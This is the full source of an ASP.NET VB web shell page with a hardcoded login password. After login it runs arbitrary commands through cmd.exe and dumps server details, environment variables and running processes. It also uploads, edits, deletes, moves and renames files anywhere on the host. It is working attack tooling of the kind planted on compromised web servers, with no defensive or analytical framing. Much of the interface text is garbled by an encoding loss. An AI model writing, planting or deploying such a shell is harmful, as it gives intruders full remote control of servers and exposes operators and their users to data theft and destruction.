<%@page Language="VB" Debug="true" trace="false" validateRequest="false" %>
<%@ import namespace="System.IO"%>
<%@ import namespace="System.Net"%>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">

dim url as string
dim xfile as fileinfo
dim mydir as directoryInfo
private PassWord as string="jay" 
dim xdir  as directoryinfo

Sub Page_Load(Src as object, E as EventArgs)
	if request.QueryString("src")<>"" then
		url=request.QueryString("src")
	else
		url=server.MapPath(".") & "\"
	end if
	if session("test")<>"jay" then
		call login()
	else
		Dim ex as Exception
		Try
			dim action as string=request.params("act")
			select case action
				case "info"
					call info()
				case "cmdshell"
					call cmdshell()
				case "loginout"
					call loginout()
				case "filemanage"
					call filemanage()
				case "edit"
					call edit()
				case "del"
					call del()
				case "rename"
					call rename()
			end select
		Catch ex
			lblerror.Text =("<font color=""red"">Exception��</font>" & ex.Message)
		End Try
	end if
end sub

sub login()
	panel01.visible="true"
	panel02.visible="false"
	panel03.visible="false"
end sub

sub loginout()
	session.abandon()
	panel01.visible="true"
end sub

sub filemanage()
	url=request.params("src")
	if url="" then
		url=server.mappath(".") & "\"
	end if
	panel02.visible="true"
	dir.value=url
	lblpath.text="Curren Dir��"& url
end sub

sub edit()
	panel03.visible="true"
	if tbcontents.text="" then
		tbfile.text=request.QueryString("src")
		dim objreader as new streamreader(tbfile.text,encoding.default)
		tbcontents.text=objreader.readtoend
		objreader.close
	end if
end sub

sub writefile(Src As Object, E As EventArgs)
	dim objwriter as streamwriter
	if file.exists(tbfile.text) then
	objwriter=new streamwriter(tbfile.text,false,encoding.default)
	objwriter.write(tbcontents.text)
	objwriter.close
	end if
end sub

sub runlogin(Src As Object, E As EventArgs)
	if tbpmd.text=PassWord then 
		session("test")="jay"
		session.Timeout=3600
		call filemanage()
		panel01.visible="false"
		lblerror.text=""
	else
		lblerror.text="<font color='red'>Password Wrong��</font><br>"
	end if
end sub

sub info()
	lblinfo.text+=("<em>Client IP:</em>" & request.ServerVariables("REMOTE_ADDR") & "<br>")
	lblinfo.text+=("<em>Client Brower:</em>" & request.ServerVariables("HTTP_USER_AGENT") & "<br>")
	lblinfo.text+=("<em>Server Edition:</em> " & Environment.OSVersion.tostring() & "<br>")
	lblinfo.text+=("<em>IIS Edition:</em>" & request.ServerVariables("SERVER_SOFTWARE") & "<br>")
	lblinfo.text+=("<em>Server Name:</em> "  &Environment.MachineName &"<br>")
	lblinfo.text+=("<em>Server IP: </em>")
	Dim addressList As IPAddress() = Dns.GetHostByName(Dns.GetHostName()).AddressList 
	Dim i As Integer 
	For i = 0 To addressList.Length - 1 
		lblinfo.text+= addressList(i).ToString() & "<br>"
	Next i 
	lblinfo.text+=("<em>Server Time:</em> "  &Environment.TickCount/1000/60/60 &"Сʱ<br>")
	lblinfo.text+=("<em>UserDomainName:</em> "  &Environment.UserDomainName &"<br>")
	lblinfo.text+=("<em>WorkingSet:</em> "  &Environment.WorkingSet &"<br>")
	lblinfo.text+=("<em>UserName:</em> "  &Environment.UserName &"<br>")
	lblinfo.text+=("<em>UserInteractive:</em> "  &Environment.UserInteractive &"<br>")
	lblinfo.text+=("<em>Logic Disk  :</em> ")  
	Dim drives As [String]()= Environment.GetLogicalDrives()
    Dim d As string
    For Each d In drives
         	lblinfo.text+="<em> " & d & " </em>"
	next d

	lblinfo.text+=("<p><em>Environment Variables :</em>")
	lblinfo.text+ = "<br>----------------------------------------------<br>"
    Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
	Dim de As DictionaryEntry
    For Each de In environmentVariables
         	lblinfo.text+="<em>" & de.Key & ":</em>" & de.Value & "<br>"
	next de
	lblinfo.text+ = "<br>----------------------------------------------<br>"
	lblinfo.text+ ="<p><em>Curren Process��</em>"
	lblinfo.text+ = "<br>----------------------------------------------<br>"
	Dim p As Process 
	For Each p In Process.GetProcesses() 
		lblinfo.text+ = p.ToString() & "<br>"
	Next p 
	lblinfo.text+ = "<br>----------------------------------------------<br>"

end sub

sub cmdshell()
	panel0.visible="true"
end sub

Sub runcmd(Src As Object, E As EventArgs)
	Dim ex as Exception
	try
		dim psi As New ProcessStartInfo("cmd.exe")
		psi.UseShellExecute = False
		psi.RedirectStandardOutput = true
		
		dim pro as new process()
		pro.startinfo=psi
		pro.startinfo.arguments="/c " & tbcmd.text
		pro.start()
		
		dim objreader as streamreader=pro.standardoutput
		lblcmd.text="<pre>" & objreader.readtoend & "</pre>"
		objreader.close()
		pro.close()
	Catch ex
		lblerror.Text =("<font color=""red"">Exception��</font>" & ex.Message)
	End Try
End Sub

Sub UploadFile_Clicked ( Sender as Object, e as EventArgs ) 
	Dim ex as Exception
	try
����	Dim lstrFileName as string 
����	Dim lstrFileNamePath as string 
����	Dim lstrFileFolder as string 
		
����	if dir.value <> "" then 
������	lstrFileFolder = dir.value 
����	else 
������	lstrFileFolder = url 
����	end if 
����	lstrFileName = loFile.PostedFile.FileName������
����	lstrFileName = Path.GetFileName ( lstrFileName ) ����	
����	If ( not Directory.Exists ( lstrFileFolder ) ) Then 
������	Directory.CreateDirectory ( lstrFileFolder ) 
����	End If ������
����	lstrFileNamePath = lstrFileFolder & lstrFileName 
����	loFile.PostedFile.SaveAs ( lstrFileNamePath ) ������	
����	FileName.Text = lstrFileName
����	FileType.Text = loFile.PostedFile.ContentType 
����	FileLength.Text = cStr ( loFile.PostedFile.ContentLength ) 
����	panel02.visible = false 
����	panel04.visible = true
������	
����Catch ex
		lblerror.Text =("<font color=""red"">�����쳣��</font>" & ex.Message)
	End Try
End sub  


sub del()
	dim temp as string
	temp=request.QueryString("src")
	call delfile(temp)  
	lblerror.text="Delete File " & temp & " Success��"
end sub

sub delfile(temp)
	Dim ex as Exception
	try
		if right(temp,1)="\" then
			dim xdir as directoryinfo
			dim mydir as new DirectoryInfo(temp)
			dim xfile as fileinfo
			for each xfile in mydir.getfiles()
				file.delete(temp & xfile.name)
			next
			for each xdir in mydir.getdirectories()
				call delfile(temp & xdir.name & "\")
			next
			directory.delete(temp)
		else
			file.delete(temp)
		end if
	Catch ex
		lblerror.Text =("<font color=""red"">Exception��</font>" & ex.Message)
	End Try
End Sub

Sub movefile ( Sender as Object, e as EventArgs ) 
	Dim ex as Exception
	try
		lblpath.text= srcfile.text & "->" & desfile.text & "Move Success��"
		File.move( srcfile.text , desfile.text ) 
	Catch ex
		lblerror.Text =("<font color=""red"">Exception��</font>" & ex.Message)
	End Try
End sub 

Sub copyfile ( Sender as Object, e as EventArgs ) 
	Dim ex as Exception
	try
		File.copy( srcfile.text , desfile.text ) 
	Catch ex
		lblerror.Text =("<font color=""red"">Exception��</font>" & ex.Message)
	End Try
End sub   

sub rename()
	url=request.QueryString("src")
	panel05.visible="true"
end sub

sub rename_clicked( Sender as Object, e as EventArgs ) 
	Dim ex as Exception
	try
		mydir=new directoryinfo(url)
		file.copy(url,mydir.parent.fullname & newfilename.text)
		call delfile(url)  
		lblpath.text="Rename " & replace(url,"\","\\") & " Success��"
	Catch ex
		lblerror.Text =("<font color=""red"">Exception��</font>" & ex.Message)
	End Try
end sub
</script>

<html><head>
<meta http-equiv="Content-Type" content="text/html" charset=gb2312>
<title>Test</title>
<style type="text/css">
A
{
	font-family: verdana, arial, Geneva, Helvetica, sans-serif;
	color: #FAFC72;
	text-decoration: none;
}

A:hover
{
	text-decoration: underline;
}

TD
{
	font-family: verdana, arial, Geneva, Helvetica, sans-serif;
	font-size: 9pt;
	color: #FFFFFF;
}

.btn
{
	color: #FAFC72;
	background-color: #000000;
}

html, body
{
	margin:0;
	padding:0;
	color: #FAFC72;
	background-color: #000000;
}
</style>
<script language="javascript">
function del()
{
if(confirm("suredelete��")){return true;}
else{return false;}
}
</script>
</head><body>
<div style="padding:15,15,15,15;font-size:10pt;font-family:verdana"; 
border-width:2px 2px 2px 2px; border-style:solid; border-color:black;">
<center>[<a href="?act=info">systemparameter</a>] | [<a href="?act=cmdshell">Net.Cmd</a>]| [<a href="?act=filemanage">filemanage</a>] | [<a href="javascript:history.back(1);">return</a>] | [<a href="?act=loginout">exit</a>]</center>
<hr width="90%">

<form method = "post" enctype = "multipart/form-data" runat = "server">

<table width="80%"  border="0" align="center">
<asp:label id="lblinfo"  runat="server"  maintainstate="false"/><p>
<asp:label id="lblerror"  runat="server"  maintainstate="false"/><p>
</table>

<asp:panel id="Panel0" runat="server"  visible="false">
<table width="80%"  border="0" align="center">
<asp:textbox id="tbcmd"  width="30%" runat="server"/>
<asp:button id="btcmd" text="runcmd" class="btn" onclick="runcmd" runat="server"/></center><br>
<asp:label id="lblcmd" runat="server"/>
</table>
</asp:panel>

<asp:panel id="panel01" runat="server"  visible="false">
<center><asp:textbox id="tbpmd" textmode="password" runat="server"/>
<asp:button id="btlogin" text="Login" class="btn" onclick="runlogin" runat="server"/></center>
</asp:panel>

<asp:panel id="panel02" runat="server"  visible="false">
<table width="80%"  border="0" align="center">
<asp:label id="lblpath" runat="server"/>
	<tr>file�ϴ���<br>	
��chooosefile��<input id = "loFile" type = "file" runat = "server" > <br >
���ϴ�Ŀ¼��<input id = "dir" type = "text" runat = "server" >
��<input type = "submit" class="btn" value = "�ϴ�file" OnServerClick = "UploadFile_Clicked" runat = "server" >
��<br >
	</tr>
	<hr>
	<tr>filemove/copy��<br>
��Դ��ַ�� <asp:textbox id="srcfile"  width="90%" runat="server" /><br >
��Ŀ�ĵ�ַ��<asp:textbox id="desfile"  width="90%" runat="server" /><br>
  <asp:button id="btmove" text="move" class="btn"��OnServerClick = "moveFile" runat = "server"/>
��<asp:button id="btcopy" text="copy" class="btn"��OnServerClick = "copyFile" runat = "server"/>
��<br >
	</tr>
	<hr>
	<tr>
		<td width="15%"><strong>name</strong></td>
		<td width="10%"><strong>��С(byte)</strong></td>
		<td width="10%"><strong>����ʱ��</strong></td>
		<td width="10%"><strong>�޸�ʱ��</strong></td>
		<td width="10%"><strong>����ʱ��</strong></td>
		<td width="25%"><strong>����</strong></td>
	</tr>
    <tr>
       <td>
		<%
		mydir=new directoryinfo(url)
		dim panel02info as string= "<tr><td><a href='?act=filemanage&src=" & server.urlencode(mydir.parent.fullname) &  "\'>��Ŀ¼..</a></td></tr>"
		response.Write(panel02info)

		for each xdir in mydir.getdirectories
			response.Write("<tr>")
			dim filepath as string 
			filepath=server.UrlEncode(url & xdir.name)
			panel02info= "<td><a href='?act=filemanage&src=" & filepath & "\" & "'>" & xdir.name & "</a></td>"
			response.Write(panel02info)
			response.Write("<td>&lt;dir&gt;</td>")
			
			response.Write("<td>" & Directory.GetCreationTime(url & xdir.name) & "</td>")
   			response.Write("<td>" & Directory.GetLastWriteTime(url & xdir.name) & "</td>")
			response.Write("<td>" & Directory.GetlastAccessTime(url & xdir.name) & "</td>")

			panel02info="<td><a href='?act=del&src=" & filepath & "\'" & " onclick='return del(this);'>delete</a></td>"
			response.Write(panel02info)
			response.Write("</tr>")
		next
		%>
		</td>
	</tr>
	<tr>
        <td>
		<%
		for each xfile in mydir.getfiles()
			dim filepath2 as string
			filepath2=server.UrlEncode(url & xfile.name)
			response.Write("<tr>")
			panel02info="<td>" & xfile.name & "</td>"
			response.Write(panel02info)
			panel02info="<td>" & xfile.length & "</td>"
			response.Write(panel02info)

			response.Write("<td>" & File.GetCreationTime(url & xfile.name) & "</td>")
			response.Write("<td>" & File.GetLastWriteTime(url & xfile.name) & "</td>")
			response.Write("<td>" & File.GetlastAccessTime(url & xfile.name) & "</td>")	

			panel02info="<td><a href='?act=edit&src=" & filepath2 & "' target='_blank'>edit</a>|<a href='?act=rename&src=" & filepath2 & "' target='_blank'>������</a>|<a href='?act=del&src=" & filepath2 & "' onClick='return del(this);'>delete</a></td>"
			response.Write(panel02info)
			response.Write("</tr>")
		next
		response.Write("</table>")
		%>
		</td>
    </tr>
</table>
</asp:panel>

<asp:panel id="panel03" runat="server"  visible="false">
<table width="80%"  border="0" align="center">
·����<asp:textbox id="tbfile"  width="90%" runat="server" /><p>
���ݣ�<asp:textbox id="tbcontents" runat="server" textmode="multiline" columns="80" rows="20" />
<p>
<asp:button id="btwrite" class="btn" runat="server" onclick="writefile" text="save"/>
</table>
</asp:panel>
<ASP:panel id = "panel04" visible = " false " runat = "server">
<table width="80%"  border="0" align="center">
�ɹ��ϴ� <ASP:label id = "FileName" runat = "server" /> <br>
file��С <ASP:label id = "FileLength" runat = "server" /> bytes <br>
file���� <ASP:label id = "FileType" runat = "server" /> <br>
</table>
</ASP:panel>
<ASP:panel id = "panel05" visible = " false " runat = "server">
<table width="80%"  border="0" align="center">
��file��: <ASP:textbox id = "newFileName" runat = "server" /> <br>
<asp:button id="btrename" class="btn" runat="server" onclick="rename_clicked" text="save"/>
</table>
</ASP:panel>
</form>  
<hr width="90%">
</div>
</body></html>